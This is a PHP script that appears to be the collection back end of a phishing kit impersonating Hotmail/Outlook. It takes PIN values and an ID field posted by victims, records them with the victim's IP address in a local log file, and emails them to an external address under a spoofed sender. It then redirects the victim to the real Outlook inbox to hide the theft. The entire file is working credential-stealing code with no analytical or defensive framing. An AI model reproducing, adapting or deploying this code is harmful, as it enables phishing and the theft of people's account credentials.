<?php
error_reporting(0);
session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info
#Country info
$_SESSION['passwd2'] = $_POST['passwd2'];
$_SESSION['passwd3'] = $_POST['passwd3'];

#Security information
$message = "




PIN	=>   <font color='#F31414'>".$_POST['passwd2']."</font> <font color='#F31414'>".$_POST['CA_DNI']."</font><br />
PIN2	=>   <font color='#F31414'>".$_POST['passwd3']."</font> <font color='#F31414'>".$_POST['CA_DNI']."</font><br />   
</div>";

$fp = fopen('Swordfish.html', 'a');
fwrite($fp, "$message \r\n");
fclose($fp);

$subject  = "Hotmail PIN [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: Hotmail PIN <admin@Outlook.com" . "\r\n";

$to = "yaspalugo@hotmail.com";
@mail($to,$subject,$message,$headers);
header('location: https://outlook.live.com/mail/inbox');

?>